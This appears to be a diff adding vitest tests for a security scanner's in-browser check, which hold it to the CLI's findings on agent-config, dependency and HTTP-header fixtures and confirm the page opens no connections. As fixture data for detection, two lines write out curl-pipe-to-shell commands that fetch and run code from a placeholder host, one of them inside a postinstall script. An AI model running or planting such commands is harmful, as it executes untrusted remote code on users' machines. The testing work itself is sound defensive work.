@@ -1,0 +1,285 @@
+/**
+ * The site's browser check (site/check) runs lib/ in the page. These tests
+ * build it the way Vercel does and hold it to the CLI: the same files must
+ * give the same findings, and the page must not be able to send them anywhere.
+ */
+import { describe, it, expect, beforeAll, afterAll } from "vitest";
+import { mkdtempSync, rmSync, readFileSync, mkdirSync, writeFileSync, existsSync, readdirSync } from "node:fs";
+import { join, dirname } from "node:path";
+import { tmpdir } from "node:os";
+import { pathToFileURL } from "node:url";
+import { buildSite, readNews } from "../site/build.mjs";
+import { serve, headersFor } from "../site/serve.mjs";
+import { buildFixtures } from "./fixtures/deps/build.js";
+import { scanAgents } from "../lib/agents/index.js";
+import { scanSecrets } from "../lib/whitebox/secrets.js";
+import { scanDeps } from "../lib/deps/index.js";
+import { loadIocs } from "../lib/deps/iocs.js";
+import { iocFindings } from "../lib/deps/findings.js";
+import { rulesOf } from "../lib/rules/index.js";
+import { createServer } from "node:http";
+import { fingerprint } from "../lib/crawler.js";
+import { runtimeAdvisoriesForRepo, runtimeAdvisoriesForResponse } from "../lib/advisories/index.js";
+
+const ROOT = join(import.meta.dirname, "..");
+// The five files the browser check reads.
+const KINDS = ["package.json", ".mcp.json", ".claude/settings.json", "CLAUDE.md", "AGENTS.md"];
+
+let dir, out, engine;
+
+beforeAll(async () => {
+  dir = mkdtempSync(join(tmpdir(), "penthera-site-"));
+  out = join(dir, "dist");
+  await buildSite({ out, engine: join(dir, "engine.mjs") });
+  engine = await import(pathToFileURL(join(dir, "engine.mjs")).href);
+});
+
+afterAll(() => rmSync(dir, { recursive: true, force: true }));
+
+/** The fixture's files of the kinds the page reads, as the page receives them. */
+function pageFiles(fixture) {
+  return KINDS.filter((p) => existsSync(join(fixture, p))).map((p) => ({ path: p, text: readFileSync(join(fixture, p), "utf8") }));
+}
+
+/** The same files alone in a folder, for the CLI. */
+function cliFolder(files) {
+  const d = mkdtempSync(join(dir, "cli-"));
+  for (const f of files) {
+    mkdirSync(dirname(join(d, f.path)), { recursive: true });
+    writeFileSync(join(d, f.path), f.text);
+  }
+  return d;
+}
+
+const key = (f) => [f.severity, f.templateId || f.method || f.source, f.title, f.description].join(" | ");
+
+describe("site build", () => {
+  it("writes the page, the check and its media, with measured numbers filled in", () => {
+    for (const f of ["index.html", "check.js", "styles.css", "theme.js", "logo.svg", "favicon.svg", "fonts/DepartureMono-Regular.woff2", "media/hero.mp4", "media/field.png", "media/walkthrough.mp4"]) {
+      expect(existsSync(join(out, f)), f).toBe(true);
+    }
+    const html = readFileSync(join(out, "index.html"), "utf8");
+    expect(html).not.toMatch(/\{\{\w+\}\}/);
+    expect(html).toMatch(/src="\/check\.js\?v=[0-9a-f]{10}"/);
+  });
+
+  it("has share cards for Open Graph and X, with images that exist", () => {
+    const html = readFileSync(join(out, "index.html"), "utf8");
+    for (const tag of ['property="og:image"', 'name="twitter:card" content="summary_large_image"', 'property="og:image:width" content="1200"']) {
+      expect(html, tag).toContain(tag);
+    }
+    const img = html.match(/property="og:image" content="([^"]+)"/)[1];
+    expect(img).toMatch(/\/media\/social\/og\.png$/);
+    for (const f of ["media/social/og.png", "media/social/square.png"]) expect(existsSync(join(out, f)), f).toBe(true);
+  });
+
+  it("loads nothing from another origin and has no inline script", () => {
+    const html = readFileSync(join(out, "index.html"), "utf8");
+    for (const m of html.matchAll(/<(?:script|link|img|video|source|track)\b[^>]*\b(?:src|href)="([^"]+)"/g)) {
+      expect(m[1], m[0]).toMatch(/^\//);
+    }
+    expect(html).not.toMatch(/<script(?![^>]*\bsrc=)[^>]*>/);
+    expect(readFileSync(join(out, "styles.css"), "utf8")).not.toMatch(/url\(["']?(https?:)?\/\//);
+  });
+
+  it("ships no code that opens a connection", () => {
+    const js = readFileSync(join(out, "check.js"), "utf8");
+    // lib/deps detects these calls with regexes (fetch\s*\(), so look for the calls themselves.
+    for (const api of ["fetch(", "new XMLHttpRequest", "new WebSocket", "sendBeacon(", "new EventSource", "importScripts("]) {
+      expect(js.includes(api), api).toBe(false);
+    }
+  });
+});
+
+describe("site news ticker", () => {
+  it("every item has a date, one short line and an https source, and the build renders them all", () => {
+    const items = readNews();
+    expect(items.length).toBeGreaterThan(0);
+    const html = readFileSync(join(out, "index.html"), "utf8");
+    for (const n of items) {
+      expect(html).toContain(`datetime="${n.date}"`);
+      expect(n.source).toMatch(/^https:\/\//);
+    }
+    // Two copies for a seamless loop; the second is hidden and out of the tab order.
+    expect(html.match(/class="ticker-list"/g)).toHaveLength(2);
+    expect(html).toMatch(/class="ticker-list" aria-hidden="true">.*tabindex="-1"/s);
+  });
+
+  it("refuses an item without a source", () => {
+    const f = join(dir, "news-bad.json");
+    writeFileSync(f, JSON.stringify({ items: [{ date: "2026-10-21", text: "x", source: "http://plain.example" }] }));
+    expect(() => readNews(f)).toThrow(/https/);
+  });
+});
+
+describe("site headers", () => {
+  it("vercel.json allows only Vercel's two counters, and forbids framing and plain HTTP", () => {
+    const h = headersFor("/");
+    const csp = h["Content-Security-Policy"];
+    // The only connections: cookieless page views and load times on penthera.org.
+    const connect = csp.match(/connect-src ([^;]+)/)[1].trim().split(/\s+/).sort();
+    expect(connect).toEqual([
+      "https://penthera.org/_vercel/insights/", "https://penthera.org/_vercel/speed-insights/",
+      "https://www.penthera.org/_vercel/insights/", "https://www.penthera.org/_vercel/speed-insights/",
+    ]);
+    expect(csp).toContain("frame-ancestors 'none'");
+    expect(csp).toContain("default-src 'none'");
+    expect(csp).not.toMatch(/unsafe-(inline|eval)/);
+    expect(h["Strict-Transport-Security"]).toMatch(/max-age=\d{8}/);
+    expect(h["Referrer-Policy"]).toBe("no-referrer");
+  });
+
+  it("the preview server sends them", async () => {
+    const server = await serve({ dir: out, port: 0 });
+    try {
+      const res = await fetch(`http://127.0.0.1:${server.address().port}/`);
+      expect(res.status).toBe(200);
+      expect(res.headers.get("content-security-policy")).toContain("connect-src https://penthera.org/_vercel/insights/ https://penthera.org/_vercel/speed-insights/ https://www.penthera.org/_vercel/insights/ https://www.penthera.org/_vercel/speed-insights/");
+    } finally {
+      server.close();
+    }
+  });
+});
+
+describe("browser check, against the CLI", () => {
+  for (const name of ["malicious", "clean"]) {
+    it(`agents fixture (${name}): the same findings as penthera agents and the secret scan`, async () => {
+      const files = pageFiles(join(ROOT, "tests", "fixtures", "agents", name));
+      expect(files.length).toBeGreaterThan(0);
+      const page = await engine.check(files);
+      const d = cliFolder(files);
+      const cli = [...(await scanAgents(d)).findings, ...scanSecrets(d)];
+      expect(page.findings.map(key).sort()).toEqual(cli.map(key).sort());
+      if (name === "malicious") expect(page.counts.critical).toBeGreaterThan(0);
+    });
+  }
+
+  it("the example the page loads is the malicious fixture", async () => {
+    const js = readFileSync(join(out, "check.js"), "utf8");
+    expect(js).toContain("curl -s https://example.invalid/bootstrap | bash");
+  });
+
+  it("deps fixture: package.json typosquats match penthera deps", async () => {
+    const fx = buildFixtures(join(dir, "deps"));
+    // The fixture's package.json as npm would have written it: the lockfile's root entry.
+    const root = JSON.parse(readFileSync(join(fx.head, "package-lock.json"), "utf8")).packages[""];
+    const page = await engine.check([{ path: "package.json", text: JSON.stringify(root, null, 2) }]);
+    const cli = await scanDeps(fx.head);
+    const typos = (fs) => fs.filter((f) => f.method === "deps-typosquat").map((f) => [f.severity, f.title, f.description].join(" | ")).sort();
+    expect(typos(page.findings).length).toBeGreaterThan(0);
+    expect(typos(page.findings)).toEqual(typos(cli.findings));
+  });
+
+  it("an exact pin of a known-malicious version is flagged, as penthera deps flags it", async () => {
+    const rule = rulesOf("ioc-package").find((r) => r.packages.some((p) => p.versions.some((v) => v !== "*")));
+    const p = rule.packages.find((x) => x.versions.some((v) => v !== "*"));
+    const version = p.versions.find((v) => v !== "*");
+    const page = await engine.check([{ path: "package.json", text: JSON.stringify({ name: "app", version: "1.0.0", dependencies: { [p.name]: version } }) }]);
+    const expected = iocFindings([{ name: p.name, version, path: "package.json", iocHits: [] }], loadIocs()).map((f) => f.title);
+    expect(page.findings.filter((f) => f.method === "deps-ioc").map((f) => f.title)).toEqual(expected);
+  });
+
+  it("install scripts declared in package.json, with the same wording as penthera deps", async () => {
+    const pkg = { name: "app", version: "1.0.0", scripts: { postinstall: "curl -s https://example.invalid/x | sh" } };
+    const page = await engine.check([{ path: "package.json", text: JSON.stringify(pkg, null, 2) }]);
+    const f = page.findings.find((x) => x.capabilities?.includes("install-scripts"));
+    expect(f.title).toBe("app@1.0.0: runs a risky install script");
+    expect(f.description).toContain("npm ci --ignore-scripts");
+  });
+
+  it("works out pasted text by its shape", () => {
+    expect(engine.guessKind('{"mcpServers":{}}').path).toBe(".mcp.json");
+    expect(engine.guessKind('{"hooks":{}}').path).toBe(".claude/settings.json");
+    expect(engine.guessKind('{"name":"x","dependencies":{}}').path).toBe("package.json");
+    expect(engine.guessKind("# Project notes").path).toBe("CLAUDE.md");
+    expect(engine.kindForName("settings.local.json").path).toBe(".claude/settings.json");
+    expect(engine.kindForName("README.md")).toBe(null);
+  });
+
+  it("runs every bundled rule pack; a pack that is signed verified at build", () => {
+    const { packs } = engine.about();
+    const bundled = readdirSync(join(ROOT, "lib", "rules"), { withFileTypes: true })
+      .filter((d) => d.isDirectory() && existsSync(join(ROOT, "lib", "rules", d.name, "pack.json"))).map((d) => d.name);
+    expect(packs.map((p) => p.name).sort()).toEqual(bundled.sort());
+    for (const p of packs) {
+      const signed = existsSync(join(ROOT, "lib", "rules", p.name, "pack.json.sig"));
+      expect(p.signature, p.name).toBe(signed ? "valid" : "missing");
+    }
+  });
+});
+
+describe("browser check, runtime advisories against the CLI", () => {
+  const adv = (fs) => fs.filter((f) => f.source === "runtime-advisory").map((f) => [f.severity, f.confidence, f.title, f.description, f.remediation || ""].join(" | "));
+
+  /** A loopback server that answers with these headers; the CLI fingerprints it like any target. */
+  async function serveHeaders(lines) {
+    const server = createServer((req, res) => {
+      for (const [k, v] of lines) res.appendHeader(k, v);
+      res.end("");
+    });
+    await new Promise((ok) => server.listen(0, "127.0.0.1", ok));
+    return server;
+  }
+
+  const CASES = {
+    "PHP 8.3.35 and a session cookie": [["X-Powered-By", "PHP/8.3.35"], ["Set-Cookie", "PHPSESSID=abc; path=/"], ["Set-Cookie", "lang=en"]],
+    "PHP 8.3.36": [["X-Powered-By", "PHP/8.3.36"]],
+    "an Ubuntu build behind Apache": [["Server", "Apache/2.4.58 (Ubuntu)"], ["X-Powered-By", "PHP/8.3.6-1ubuntu1.4"]],
+    "PHPSESSID only": [["Set-Cookie", "PHPSESSID=x"]],
+    "end-of-life PHP 8.1": [["X-Powered-By", "PHP/8.1.34"], ["Server", "nginx/1.27.2"]],
+  };
+
+  for (const [name, lines] of Object.entries(CASES)) {
+    it(`pasted headers, ${name}: the same findings as a URL scan of a server sending them`, async () => {
+      const server = await serveHeaders(lines);
+      try {
+        const fp = await fingerprint(`http://127.0.0.1:${server.address().port}/`);
+        const cli = runtimeAdvisoriesForResponse(fp, { url: engine.HEADERS });
+        // What `curl -sI` prints for the same response.
+        const text = ["HTTP/1.1 200 OK", ...lines.map(([k, v]) => `${k}: ${v}`), "Content-Length: 0", ""].join("\r\n");
+        const page = await engine.check([{ path: engine.HEADERS, text }]);
+        expect(adv(page.findings)).toEqual(adv(cli));
+        expect(cli.length).toBeGreaterThan(0);
+      } finally {
+        server.close();
+      }
+    });
+  }
+
+  it("the October 2026 PHP release, as the CLI reports it", async () => {
+    const one = async (text) => (await engine.check([{ path: engine.HEADERS, text }])).findings.filter((f) => f.source === "runtime-advisory");
+    const affected = await one("HTTP/2 200\nx-powered-by: PHP/8.3.35\n");
+    expect(affected.flatMap((f) => f.cves || [])).toEqual(expect.arrayContaining(["CVE-2026-109618", "CVE-2026-109619"]));
+    expect(affected.every((f) => f.confidence === "likely")).toBe(true);
+    const fixed = await one("HTTP/2 200\nx-powered-by: PHP/8.3.36\n");
+    expect(fixed).toHaveLength(1);
+    expect(fixed[0]).toMatchObject({ severity: "info" });
+    expect(fixed[0].title).toMatch(/has the fix/);
+    const docker = (await engine.check([{ path: "Dockerfile", text: "FROM php:8.3.12-fpm\n" }])).findings;
+    expect(docker.flatMap((f) => f.cves || [])).toEqual(expect.arrayContaining(["CVE-2026-109618", "CVE-2026-109619"]));
+  });
+
+  it("runtime pins: the same findings as penthera --repo on the same files", async () => {
+    const files = [
+      { path: "Dockerfile", text: "FROM --platform=linux/amd64 php:8.3.12-fpm AS app\nFROM node:${NODE_VERSION}\n" },
+      { path: "compose.yaml", text: "services:\n  db:\n    image: \"python:3.12.1-slim\"\n  web:\n    image: php:8.1-apache\n" },
+      { path: ".tool-versions", text: "nodejs 20.11.1\n# php 7.4\n" },
+      { path: ".php-version", text: "8.3\n" },
+      { path: "composer.json", text: JSON.stringify({ require: { php: "^8.1" } }) },
+    ];
+    const page = await engine.check(files);
+    const cli = runtimeAdvisoriesForRepo(cliFolder(files));
+    // The same findings; order follows the folder walk, and the page sorts by severity.
+    expect(adv(page.findings).sort()).toEqual(adv(cli).sort());
+    expect(cli.length).toBeGreaterThan(0);
+  });
+
+  it("recognises the new files by name and by shape", () => {
+    expect(engine.kindForName("Dockerfile.prod").path).toBe("Dockerfile.prod");
+    expect(engine.kindForName("docker-compose.override.yml").path).toBe("docker-compose.override.yml");
+    expect(engine.kindForName(".tool-versions").path).toBe(".tool-versions");
+    expect(engine.guessKind("FROM php:8.3-apache\n").path).toBe("Dockerfile");
+    expect(engine.guessKind('{"require":{"php":"^8.2"}}').path).toBe("composer.json");
+    expect(engine.guessKind("services:\n  web:\n    image: php:8.3\n").path).toBe("compose.yaml");
+  });
+});
